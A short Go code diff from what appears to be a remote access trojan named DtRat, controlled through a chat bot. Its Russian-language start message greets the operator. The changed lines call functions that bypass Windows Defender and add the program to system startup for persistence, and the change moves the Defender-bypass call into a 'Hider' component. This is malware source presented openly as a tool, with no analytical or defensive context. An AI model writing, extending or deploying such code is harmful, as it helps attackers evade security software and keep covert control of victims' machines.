@@ -16,8 +16,9 @@ func errToStatus(err error) string {
 
 func (r *Rat) startCmd() {
 	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.\n\nНачата первоначальная инициализация.", config.Version)
+
+	suc, total := r.Hider.BypassDefender()
 	err := r.Hider.AddToStartup()
-	suc, total := r.Engine.System.BypassDefender()
 
 	doneTxt :=
 		`
